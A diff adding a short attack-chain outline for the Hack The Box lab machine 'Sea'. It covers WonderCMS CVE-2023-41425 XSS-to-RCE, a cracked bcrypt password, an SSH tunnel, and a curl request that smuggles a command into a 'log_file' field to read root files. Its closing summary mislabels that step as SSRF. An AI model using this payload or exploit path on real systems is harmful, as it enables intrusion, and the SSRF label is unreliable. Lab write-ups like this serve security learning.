@@ -1,3 +1,33 @@
+SEA (HTB) — ATTACK CHAIN
+
+Reconnaissance
+├── nmap -sC -sV -A → 22 (SSH), 80 (Apache 2.4.41 Ubuntu)
+└── /etc/hosts: 10.129.2.179 sea.htb
+
+Foothold
+├── ffuf → /themes/bike/ → README.md (WonderCMS)
+├── /themes/bike/version → 3.2.0
+├── CVE-2023-41425 (XSS → RCE через installModule)
+├── XSS-ссылка через contact.php → админ кликает
+└── Reverse shell → www-data@sea
+
+Lateral Movement / Credentials
+├── /var/www/sea/data/database.js
+│   └── bcrypt hash: $2y$10$iOrk210RQSAzNCx6Vyq2X...
+├── hashcat -m 3200 → mychemicalromance
+└── su - amay → user.txt (<USER_FLAG>)
+
+Privilege Escalation
+├── netstat → 127.0.0.1:8080 (monitoring.service от root)
+├── SSH-туннель: ssh amay@sea.htb -L 8081:127.0.0.1:8080
+├── curl -X POST http://localhost:8081/ \
+│     -u amay:mychemicalromance \
+│     -d "log_file=/root/root.txt;cat&analyze_log="
+└── root flag (<ROOT_FLAG>)
+
+
+
+
 Initial: XSS → RCE (WonderCMS CVE-2023-41425)
 
 Root: Cracked bcrypt hash → amay → SSRF via internal service → root
